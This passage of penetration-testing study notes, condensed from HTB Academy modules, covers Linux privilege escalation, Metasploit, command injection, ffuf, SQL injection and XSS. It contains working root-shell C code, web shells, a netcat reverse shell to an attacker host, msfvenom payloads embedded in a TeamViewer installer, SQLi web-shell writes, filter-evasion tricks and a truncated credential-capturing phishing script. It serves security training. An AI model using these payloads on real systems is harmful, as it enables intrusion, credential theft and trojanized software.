sudo mount -t nfs <TARGET>:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell

# On the target
/tmp/shell
```

Tmux session hijacking:

```bash
ps aux | grep tmux
ls -la /shareds
tmux -S /shareds
```

### Linux Internals-Based Privilege Escalation

#### Kernel Exploits

```bash
uname -a
cat /etc/lsb-release
```

Search for the kernel version, compile a public PoC, and run it:

```bash
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
./kernel_exploit
```

Kernel exploits can crash or destabilize the target. Prefer a PoC matching the exact kernel and distribution.

#### Shared Libraries (LD_PRELOAD)

```bash
sudo -l    # look for env_keep+=LD_PRELOAD
ldd /bin/ls
```

`root.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

#### Shared Object Hijacking

```bash
ls -la payroll
ldd payroll
readelf -d payroll | grep PATH
ls -la /development/
```

If the binary loads a library from a writable `RUNPATH` and calls a function such as `dbquery`, create a malicious library exporting that symbol:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
    setuid(0);
    system("/bin/sh -p");
}
```

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
./payroll
```

#### Python Library Hijacking

```bash
sudo -l
python3 -c 'import sys; print("\n".join(sys.path))'
pip3 show psutil
ls -la /usr/lib/python3.8
```

1. **Insecure module permissions** — edit the imported function directly:
   ```python
   def virtual_memory():
       import os
       os.system('id')
       # ... original code ...
   ```
   ```bash
   sudo /usr/bin/python3 ./mem_status.py
   ```

2. **Library search path** — create a module with the same name earlier in `sys.path`:
   ```python
   # psutil.py
   import os
   def virtual_memory():
       os.system('id')
   ```
   ```bash
   sudo /usr/bin/python3 mem_status.py
   ```

3. **PYTHONPATH** — if `sudo -l` shows `SETENV`, point Python at a writable directory:
   ```bash
   sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
   ```

### Recent 0-Days

#### Sudo — CVE-2021-3156 (Baron Samedit)

```bash
sudo -V | head -n1

git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich
./sudo-hax-me-a-sandwich 1
```

#### Sudo Policy Bypass — CVE-2019-14287

Requires a `sudoers` entry that permits a specific command for any user (`ALL=(ALL) /usr/bin/id`), and sudo below 1.8.28.

```bash
sudo -l
sudo -u#-1 id
```

#### Polkit — CVE-2021-4034 (PwnKit)

```bash
pkexec -u root id

git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
./poc
```

#### Dirty Pipe — CVE-2022-0847

Affects Linux kernels 5.8 through 5.17.

```bash
uname -r

git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh

./exploit-1
find / -perm -4000 2>/dev/null
./exploit-2 /usr/bin/sudo
```

#### Netfilter

```bash
uname -r
```

CVE-2021-22555 (kernels 2.6 – 5.11):

```bash
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

CVE-2022-25636 (kernels 5.4 – 5.6.10):

```bash
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

CVE-2023-32233 (kernels up to 6.3.1):

```bash
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

These exploits can corrupt the kernel and require a reboot. Use them only when the target matches the affected range.

### Hardening Considerations

- **Patch** kernels, `sudo`, container runtimes, and installed packages; use `unattended-upgrades` (Debian/Ubuntu) or `yum-cron` (RHEL).
- **Audit** SUID/SGID binaries, writable files, cron jobs, and library paths.
- **Use absolute paths** in `sudoers` and cron entries.
- **Do not store cleartext credentials** in world-readable files.
- **Restrict privileged groups** (`sudo`, `docker`, `lxd`, `disk`, `adm`, `shadow`).
- **Apply least privilege** to `sudo` rights and service accounts.
- **Protect custom libraries and Python modules** from low-privileged writes.
- **Remove unnecessary packages and services** to reduce attack surface.
- **Enable SELinux or AppArmor**, monitor logs, and use auditing.
- Run a baseline audit:
  ```bash
  ./lynis audit system
  ```

### Skills Assessment

The module's skills assessment is intentionally not summarized here. Complete it directly in the HTB Academy lab.

### References

- [HTB Academy — Linux Privilege Escalation](https://academy.hackthebox.com/app/module/51)
- [GTFOBins](https://gtfobins.github.io/)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [pspy](https://github.com/DominicBreuker/pspy)
- [Payloads All The Things — Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

## 14. Penetration Testing Process

> Condensed from HTB Academy **Penetration Testing Process** (module 90). This is the engagement workflow and closeout checklist behind the technical sections.

### Laws & Regulations

- Obtain written authorization and a signed scope/RoE before testing.
- Follow data-protection and privacy law (GDPR, CCPA, local equivalents).
- Respect industry obligations (PCI DSS, HIPAA, ISO 27001) and client-specific policies.
- Define data handling, storage, retention, and destruction for evidence.
- Report critical/safety-impacting findings through the agreed escalation path.
- Do not test third-party or out-of-scope assets without explicit permission.

### Engagement Stages

```text
Pre-Engagement
  -> Information Gathering
  -> Vulnerability Assessment
  -> Exploitation
  -> Post-Exploitation
  -> Lateral Movement
  -> Proof-of-Concept
  -> Post-Engagement
```

#### Pre-Engagement

- Define scope, targets, exclusions, and testing windows.
- Agree on rules of engagement (RoE), emergency contacts, and escalation paths.
- Confirm authorization, contracts, and any third-party/contractor agreements.
- Hold a kick-off meeting; document assumptions and communication channels.
- Prepare infrastructure, tooling, and a secure location for evidence.

#### Information Gathering

- Open-source intelligence: employees, infrastructure, leaks, public documents.
- Infrastructure enumeration: domains, subdomains, IP ranges, cloud assets.
- Service enumeration: ports, versions, banners, exposed admin interfaces.
- Host enumeration: users, shares, local services, installed software.
- Pillaging: collect data that informs later phases without disrupting the target.

#### Vulnerability Assessment

- Research known vulnerabilities for discovered versions and configurations.
- Map possible attack vectors and rank them by likelihood and impact.
- Return to enumeration when a vector needs more detail.

#### Exploitation

- Prioritize attacks by expected impact and reliability.
- Prepare payloads, listeners, and fallback options.
- Confirm access and document every step for the report.

#### Post-Exploitation

- Evasive testing where required by the RoE.
- Local information gathering and pillaging.
- Persistence only when explicitly in scope.
- Local vulnerability assessment and privilege escalation.
- Data exfiltration only within the agreed scope.

#### Lateral Movement

- Pivot into newly reachable networks.
- Repeat evasive testing, enumeration, vulnerability assessment, exploitation, and post-exploitation on each new host.

#### Proof-of-Concept

- Demonstrate impact with the minimum necessary access.
- Capture commands, timestamps, screenshots, and evidence hashes.
- Avoid changes that are not required for the proof.

#### Post-Engagement

- Clean up shells, accounts, files, and configuration changes.
- Write the report: executive summary, technical findings, evidence, remediation.
- Hold a report review meeting and obtain deliverable acceptance.
- Offer post-remediation testing and define data-retention/close-out terms.

### Practice

- Re-run the full workflow on labs and retired boxes.
- Keep a checklist for each phase so nothing is skipped under time pressure.

## 15. Getting Started

> Condensed from HTB Academy **Getting Started** (module 77). Much of the basic tooling is already covered in sections 2–7; this section keeps the end-to-end HTB workflow and the Nibbles walkthrough.

### Setup

```bash
# Connect to the lab VPN
sudo openvpn user.ovpn

# Confirm the tunnel address and routes
ip -4 a show tun0
sudo netstat -rn

# Organize engagement files
tree Projects/
```

Use a note-taking structure per target: scans, credentials, screenshots, and findings.

### Basic Workflow

1. **Enumeration** — `nmap -sV -sC -p- <TARGET_IP>`; then inspect each open service.
2. **Web enumeration** — `whatweb`, `curl -IL`, `gobuster dir`/`dns`.
3. **Public exploits** — `searchsploit`, then validate the exploit before running it.
4. **Initial access** — reverse/bind/web shell, then stabilize the TTY.
5. **Privilege escalation** — local enumeration, `sudo -l`, SUID/SGID, kernel version.
6. **File transfer** — HTTP server, SCP, base64, or the target's native tools.

```bash
# Service and web discovery
nmap -sV -sC -p- <TARGET_IP>
nmap --script smb-os-discovery.nse -p445 <TARGET_IP>
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
whatweb <TARGET_IP>

# SMB and SNMP examples
smbclient -N -L \\\\<TARGET_IP>
smbclient -U <USER> \\\\<TARGET_IP>\\<SHARE>
snmpwalk -v 2c -c <COMMUNITY> <TARGET_IP>

# Public exploit lookup
searchsploit openssh 7.2
msfconsole -q
```

### Shells and Stabilization

```bash
# Listener
nc -lvnp 1234

# Upgrade a basic shell to a PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z, then:
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 120
```

Web shell examples:

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```aspx
<% eval request("cmd") %>
```

### Privilege Escalation and File Transfer

```bash
./linpeas.sh
sudo -l
sudo -u <USER> /bin/echo Hello World!

# SSH key reuse
chmod 600 id_rsa
ssh root@<TARGET_IP> -i id_rsa

# Serve files from the attack host
python3 -m http.server 8000

# Transfer with SCP
scp linenum.sh <USER>@<TARGET_IP>:/tmp/linenum.sh
```

### Nibbles Walkthrough

A compact example of the full workflow. Replace `<TARGET_IP>` and redacted secrets.

```bash
# Enumeration
nmap -sV --open -oA nibbles_initial_scan <TARGET_IP>
nmap -sC -p 22,80 -oA nibbles_script_scan <TARGET_IP>
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum <TARGET_IP>

# Web footprinting
whatweb http://<TARGET_IP>
curl http://<TARGET_IP>
gobuster dir -u http://<TARGET_IP>/nibbleblog/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
curl -s http://<TARGET_IP>/nibbleblog/README
curl -s http://<TARGET_IP>/nibbleblog/content/private/users.xml | xmllint --format -
curl -s http://<TARGET_IP>/nibbleblog/content/private/config.xml | xmllint --format -
```

The admin credentials are found during enumeration; use them only in the lab. After uploading a PHP plugin shell:

```bash
curl http://<TARGET_IP>/nibbleblog/content/private/plugins/my_image/image.php
```

Privilege escalation via a writable monitor script:

```bash
unzip personal.zip
cat monitor.sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 8443 >/tmp/f' | tee -a monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

Metasploit alternative:

```text
msf6 > search nibbleblog
msf6 > use 0
msf6 > set rhosts <TARGET_IP>
msf6 > set lhost <ATTACKER_IP>
msf6 > set username admin
msf6 > set password <PASSWORD>
msf6 > set targeturi nibbleblog
msf6 > set payload generic/shell_reverse_tcp
msf6 > exploit
```

### Common Pitfalls

```bash
# VPN not connecting
sudo openvpn ./htb.ovpn
ip -4 a show tun0
ping -c 4 10.10.14.1

# Regenerate missing SSH keys
ssh-keygen
```

- Re-scan after changes; services and versions may differ from the first scan.
- Stabilize shells before running interactive tools.
- Keep a log of every command and result for the report.

## 16. Vulnerability Assessment

> Condensed from HTB Academy **Vulnerability Assessment** (module 108).

### Assessment Types

- **Vulnerability assessment** — identify and rank weaknesses; no exploitation.
- **Penetration test** — validate impact through controlled exploitation.
- **Compliance/audit** — measure against a standard or framework.
- **Standards** — PTES, OWASP WSTG, NIST, CIS, ISO 27001, PCI DSS.

### Scoring and References

- **CVSS** — base, temporal, and environmental scores; use the vector string in reports.
- **CVE** — public identifier for a specific vulnerability.
- **CWE** — weakness class; useful for root-cause and remediation guidance.
- Validate scanner findings manually; scanners produce false positives and false negatives.

### Nessus

```bash
# Install and start the daemon
sudo dpkg -i Nessus-<VERSION>-ubuntu910_amd64.deb
sudo systemctl start nessusd.service

# Open the web UI (default https://<SCANNER_IP>:8834), then create a scan
```

Useful scan profiles: basic network scan, credentialed patch audit, web application tests, malware scan. Review false positives and export results.

```bash
# Example export helper
./nessus_downloader.rb

# SSL/TLS checks
sslscan example.com

# Interface/bandwidth checks during large scans
sudo apt install vnstat
sudo vnstat -l -i <INTERFACE>
```

### OpenVAS / GVM

```bash
sudo apt-get update && sudo apt-get -y full-upgrade
sudo apt-get install gvm && openvas
sudo gvm-setup
sudo gvm-start

# Export a report to XLSX
python3 -m openvasreporting -i report-<ID>.xml -f xlsx
```

### Nessus Advanced Settings & Export

- Use credentialed scans where authorized (SSH/SMB/Windows credentials) to improve accuracy.
- Tune plugin families, port ranges, and performance to avoid disruptions.
- Review false positives and validate critical findings manually.
- Export formats: `.nessus`, CSV, HTML, PDF; use `nessus_downloader.rb` for automation.
- Compare scans over time to track remediation.
- Store reports and evidence according to the engagement's retention policy.

### Reporting

- Executive summary: scope, approach, risk posture, top findings.
- Technical findings: description, affected asset, evidence, CVSS, remediation.
- Include positive controls and retest guidance.
- Store evidence and reports according to the engagement's data-retention terms.

## 17. Using the Metasploit Framework

> Condensed from HTB Academy **Using the Metasploit Framework** (module 39).

### MSFconsole Basics

```bash
msfconsole
msfconsole -q
```

```text
msf6 > help
msf6 > version
msf6 > show modules
msf6 > search <term>
msf6 > use <module>
msf6 > info
msf6 > options
msf6 > back
```

### Modules, Targets, and Payloads

```text
msf6 > search eternalromance
msf6 > search eternalromance type:exploit
msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft

msf6 > use 0
msf6 > show options
msf6 > show targets
msf6 > set target <ID>
msf6 > show payloads
msf6 > set payload <PAYLOAD>
msf6 > set RHOSTS <TARGET_IP>
msf6 > set LHOST <ATTACKER_IP>
msf6 > set LPORT <PORT>
msf6 > check
msf6 > run
msf6 > exploit
```

Use `setg` for global options and `unsetg` to clear them:

```text
msf6 > setg RHOSTS <TARGET_IP>
msf6 > setg LHOST <ATTACKER_IP>
msf6 > unsetg RHOSTS
```

Filtering payloads:

```text
msf6 > grep meterpreter show payloads
msf6 > grep -c meterpreter show payloads
msf6 > grep meterpreter grep reverse_tcp show payloads
```

### Encoders and Evasion

```text
msf6 > show encoders
msf6 > set encoder <ENCODER>
msf6 > set EnableStageEncoding true
```

```bash
# Legacy pipeline (msfpayload/msfencode)
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | \
  msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

# Modern msfvenom
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp \
  LHOST=<ATTACKER_IP> LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

Encoders are not a substitute for testing against the target's AV/EDR. Check payloads with `msf-virustotal` using your own API key.

### Database and Workspaces

```bash
sudo service postgresql status
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb status
sudo msfdb run
```

```text
msf6 > db_status
msf6 > workspace
msf6 > workspace -a <ENGAGEMENT>
msf6 > workspace <ENGAGEMENT>
msf6 > db_nmap -sV -sS <TARGET_IP>
msf6 > hosts
msf6 > services
msf6 > creds
msf6 > loot
msf6 > db_import <SCAN_FILE>.xml
msf6 > db_export -f xml backup.xml
```

### Sessions and Jobs

```text
msf6 > sessions
msf6 > sessions -i <ID>
msf6 > jobs
msf6 > jobs -l
msf6 > exploit -j
```

### Meterpreter

```text
meterpreter > help
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps
meterpreter > steal_token <PID>
meterpreter > getuid
meterpreter > hashdump
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
meterpreter > shell
meterpreter > background
```

Local privilege escalation workflow:

```text
msf6 > search local_exploit_suggester
msf6 > use 0
msf6 > set SESSION <ID>
msf6 > run
msf6 > use exploit/windows/local/<MODULE>
msf6 > set SESSION <ID>
msf6 > set LHOST <ATTACKER_IP>
msf6 > run
meterpreter > getuid
```

### Plugins & Mixins

```text
msf6 > ls /usr/share/metasploit-framework/plugins/
msf6 > load nessus
msf6 > nessus_help
msf6 > load pentest
msf6 > help
```

Plugins extend MSFconsole with new commands and integrations. User plugins can be placed in `~/.msf4/plugins/` and loaded with `load <name>`. Mixins are Ruby modules used when writing custom Metasploit modules.

### Writing and Importing Modules

```bash
ls /usr/share/metasploit-framework/modules
ls ~/.msf4/modules
cp <MODULE>.rb /usr/share/metasploit-framework/modules/exploits/<PATH>/
```

```text
msf6 > reload_all
msf6 > loadpath /usr/share/metasploit-framework/modules/
msf6 > use <MODULE>
```

### MSFvenom and Handlers

```bash
# Windows executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1337 -f exe -o shell.exe

# ASPX payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1337 -f aspx > reverse_shell.aspx
```

```text
msf6 > use multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST <ATTACKER_IP>
msf6 > set LPORT 1337
msf6 > run
```

### Wrapping and Packing

```bash
# Embed a payload in a legitimate executable
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=8080 \
  -k -x TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows \
  -o TeamViewer_Setup_payload.exe -i 5

# Optional archive wrapping (not encryption)
rar a payload.rar -p payload.js
```

### References

- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
- [Rapid7 Metasploit documentation](https://docs.rapid7.com/metasploit/)

## 18. Using Web Proxies

> Condensed from HTB Academy **Using Web Proxies** (module 110). Burp Suite and ZAP are GUI-driven; this section records the setup and the command-line integration points.

### Proxy Setup

1. Start Burp or ZAP and confirm the proxy listener (default `127.0.0.1:8080`).
2. Point Firefox at the proxy, or use the tool's pre-configured browser.
3. Install the proxy's CA certificate and trust it for websites.
4. Verify HTTPS interception works before testing.

Burp: `Proxy > Proxy settings > Proxy listeners`.
ZAP: `Tools > Options > Network > Local Servers/Proxies`.

### Core Workflow

- **Intercept** — pause, inspect, and modify requests/responses.
- **Repeater** — resend a request with manual changes; useful for auth, IDOR, injection.
- **Intruder / Fuzzer** — automate payload positions, wordlists, and attack types.
- **Scanner** — active/passive checks; validate findings manually.
- **Extensions** — install only from trusted sources.

### Burp/ZAP Feature Map

| Feature | Burp Suite | ZAP |
|---|---|---|
| Intercept requests/responses | Proxy > Intercept | Break / Proxy |
| Repeat and edit a request | Repeater | Requester |
| Automated fuzzing | Intruder | Fuzzer |
| Automated scanning | Scanner | Active/Passive Scan |
| Encode/decode | Decoder | Encoder/Decoder |
| Compare responses | Comparer | Diff |
| Automatic header/body changes | Match and Replace | Replacer |
| Extensions | BApp Store | ZAP Add-ons |

Use **Intercept** to inspect and modify traffic, **Repeater/Requester** for manual testing, **Intruder/Fuzzer** for payload positions and wordlists, and **Scanner** for baseline checks. Validate scanner output manually.

### Proxying Command-Line Tools

`proxychains`:

```bash
# /etc/proxychains.conf
# socks4 127.0.0.1 9050
http 127.0.0.1 8080
```

```bash
proxychains -q curl http://<TARGET>
```

Nmap (experimental):

```bash
nmap -h | grep -i prox
nmap --proxies http://127.0.0.1:8080 <TARGET_IP> -p<PORT> -Pn -sC
```

Metasploit:

```text
msf6 > use auxiliary/scanner/http/robots_txt
msf6 > set PROXIES HTTP:127.0.0.1:8080
msf6 > set RHOST <TARGET_IP>
msf6 > set RPORT <PORT>
msf6 > run
```

Other tools: set `HTTP_PROXY`/`HTTPS_PROXY` where supported, or use the tool's `--proxy`/`-x` flag. Proxy only when inspecting traffic; it slows tools down.

### Useful Burp/ZAP Features

- Match/replace rules for automatic header or parameter changes.
- Scope and target filtering to avoid noise.
- Decoder for URL/base64/hex transformations.
- Comparer for response diffing.
- Save project files and export findings.

## 19. Command Injections

> Condensed from HTB Academy **Command Injections** (module 109).

### Detection

Identify inputs that reach OS commands (for example a Host Checker running `ping -c 1 <INPUT>`). Try appending an operator and a harmless command; a change in output indicates injection.

| Operator | Character | URL-encoded | Behavior |
|---|---|---|---|
| Semicolon | `;` | `%3b` | Both commands |
| New line | `\n` | `%0a` | Both commands |
| Background | `&` | `%26` | Both commands |
| Pipe | `\|` | `%7c` | Both, only second output |
| AND | `&&` | `%26%26` | Both, if first succeeds |
| OR | `\|\|` | `%7c%7c` | Second, if first fails |
| Sub-shell | \` | `%60%60` | Both (Linux) |
| Sub-shell | `$()` | `%24%28%29` | Both (Linux) |

### Basic Exploitation

```bash
# Local validation
ping -c 1 127.0.0.1; whoami
ping -c 1 127.0.0.1 && whoami
ping -c 1 127.0.0.1 || whoami
ping -c 1 || whoami
```

If front-end validation blocks the payload, intercept the request in Burp/ZAP, URL-encode the payload (`Ctrl+U` in Burp), and send it directly to the back end.

```http
POST /check HTTP/1.1
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%3b+whoami
```

### Filter Evasion

**Spaces:**

```bash
cat</etc/passwd
cat${IFS}/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd
```

**Blacklisted characters:**

```bash
echo ${PATH}
echo ${PATH:0:1}          # /
echo ${LS_COLORS:10:1}    # ;
echo %HOMEPATH:~6,-11%    # Windows
$env:HOMEPATH[0]          # PowerShell
```

Build characters from variables or use encoding/`tr` to avoid literal blacklist entries.

**Blacklisted commands:**

```bash
who^ami                    # Windows CMD
w'h'o'a'm'i                # shell quote insertion
w\h\o\a\m\i                # backslash insertion
"whoami"
```

**Case and string manipulation:**

```bash
WhOaMi
echo 'whoami' | rev
"whoami"[-1..-20] -join ''            # PowerShell
iex "$('imaohw'[-1..-20] -join '')"  # PowerShell
```

**Base64 and encoding:**

```bash
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

# PowerShell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

### Obfuscation Tools

```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
cd ./bashfuscator/bin/
./bashfuscator -c 'cat /etc/passwd'
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
```

### Blind / Out-of-Band Checks

- Use time delays (`sleep`, `ping -c`) to confirm execution when output is not returned.
- Use an HTTP/DNS callback to a host you control.
- URL-encode payloads and test each operator separately.

### Prevention

- Avoid passing user input to shell commands; use language APIs and allowlists.
- Validate input against a strict pattern (for example an IP address regex).
- Escape shell metacharacters and use parameterized APIs.
- Run services with least privilege and disable unnecessary shell functions.
- Use a WAF as defense in depth, not as the only control.

## 20. Attacking Web Applications with Ffuf

> Condensed from HTB Academy **Attacking Web Applications with Ffuf** (module 54).

### Directory and Page Fuzzing

```bash
# Basic directory fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://<TARGET>/FUZZ

# Discover extensions for a known page
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ \
  -u http://<TARGET>/blog/indexFUZZ

# Discover pages with a known extension
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://<TARGET>/blog/FUZZ.php

# Recursive fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://<TARGET>/FUZZ -recursion -recursion-depth 1 -e .php -v
```

### Domain and Vhost Fuzzing

```bash
# Subdomain fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u https://FUZZ.<DOMAIN>/

# Virtual-host fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u http://<TARGET>/ -H 'Host: FUZZ.<DOMAIN>'

# Filter out the default response size
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
  -u http://<TARGET>/ -H 'Host: FUZZ.<DOMAIN>' -fs <SIZE>
```

Add discovered hosts to `/etc/hosts`:

```bash
sudo sh -c 'echo "<TARGET_IP>  <VHOST>.<DOMAIN>" >> /etc/hosts'
```

### Parameter and Value Fuzzing

```bash
# GET parameter names
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u "http://<TARGET>/admin.php?FUZZ=key" -fs <SIZE>

# POST parameter names
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u http://<TARGET>/admin.php -X POST -d 'FUZZ=key' \
  -H 'Content-Type: application/x-www-form-urlencoded' -fs <SIZE>

# Value fuzzing
for i in $(seq 1 1000); do echo $i >> ids.txt; done
ffuf -w ids.txt:FUZZ -u http://<TARGET>/admin.php -X POST -d 'id=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' -fs <SIZE>
```

### Result Filters

| Flag | Effect |
|---|---|
| `-fs <size>` | Filter by response size |
| `-fc <code>` | Filter by status code |
| `-fw <words>` | Filter by word count |
| `-fl <lines>` | Filter by line count |
| `-fr <regex>` | Filter by response regex |
| `-mc <code>` | Match status code |
| `-mr <regex>` | Match response regex |

Use `ffuf -h` for the full option list. Save output with `-o results.json -of json`.

## 21. SQL Injection Fundamentals

> Condensed from HTB Academy **SQL Injection Fundamentals** (module 33).

### MySQL Basics

```bash
mysql -u <USER> -p -h <HOST> -P 3306
```

```sql
SELECT * FROM <TABLE>;
SELECT <COLUMN1>, <COLUMN2> FROM <TABLE>;
SELECT * FROM <TABLE> WHERE <CONDITION>;
SELECT * FROM <TABLE> ORDER BY <COLUMN> [ASC|DESC];
SELECT * FROM <TABLE> LIMIT <N>;
SELECT * FROM <TABLE> LIMIT <OFFSET>, <N>;
SELECT * FROM <TABLE> WHERE <COLUMN> LIKE '<PATTERN>';
```

Common operators: `AND`, `OR`, `NOT`, `=`, `!=`, `>`, `<`, `LIKE`, `IN`, `BETWEEN`.

### Authentication Bypass

```sql
-- Vulnerable query: SELECT * FROM users WHERE username='<INPUT>' AND password='<INPUT>';
' OR '1'='1'-- -
' OR 1=1-- -
admin'-- -
' OR '1'='1' #
```

The comment sequence terminates the rest of the original query; the exact comment style depends on the DBMS (`-- -`, `#`, `/* */`).

### UNION Injection

```sql
-- Find the number of columns
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -

-- Confirm the display columns
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3,4-- -

-- Extract data into the visible columns
' UNION SELECT 1,username,password,4 FROM users-- -
```

### Database Enumeration

```sql
SELECT database();
SELECT @@version;
SELECT user();
SELECT current_user();

SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA;
SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='<DB>';
SELECT column_name, table_name, table_schema FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='<TABLE>';
```

```sql
-- Via UNION
' UNION SELECT 1,schema_name,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
' UNION SELECT 1,database(),3,4-- -
' UNION SELECT 1,table_name,table_schema,4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='<DB>'-- -
' UNION SELECT 1,column_name,table_name,table_schema FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='<TABLE>'-- -
```

### Reading and Writing Files

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/index.php');

-- Check the file-import/export restriction
SELECT variable_name, variable_value FROM information_schema.global_variables
WHERE variable_name='secure_file_priv';

-- Write a file (requires FILE privilege and a writable destination)
SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

```sql
-- Web shell via UNION
' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

### Mitigations

- Use prepared statements/parameterized queries.
- Apply least privilege to the database account; avoid `FILE` and `SUPER` where possible.
- Validate and allowlist input; escape output.
- Disable detailed SQL errors in production.
- Use a WAF as defense in depth.

## 22. Cross-Site Scripting (XSS)

> Condensed from HTB Academy **Cross-Site Scripting (XSS)** (module 103).

### Types

- **Stored XSS** — payload is persisted (comments, profiles, support tickets).
- **Reflected XSS** — payload is reflected from the request (search, error pages).
- **DOM XSS** — client-side JavaScript writes untrusted data into the DOM.

### Test Payloads

```html
<script>alert(window.origin)</script>
<img src=x onerror=alert(window.origin)>
<svg onload=alert(window.origin)>
"><script>alert(window.origin)</script>
'><script>alert(window.origin)</script>
```

Use `window.origin` instead of `alert(1)` to confirm which origin executed the payload. Inspect the DOM to see whether the payload is stored, reflected, or written by JavaScript.

### Discovery

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "http://<TARGET>/index.php?task=test"
```

Also test each input/context manually: HTML body, attributes, JavaScript strings, URLs, and DOM sinks.

### Defacing

```html
<script>document.body.style.background = "#141d2b"</script>
<script>document.body.background = "https://<ATTACKER>/image.png"</script>
<script>document.title = 'Defaced'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<h1>Defaced</h1>'</script>
```

### Phishing

Host a fake login page and capture submitted credentials in a controlled lab:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
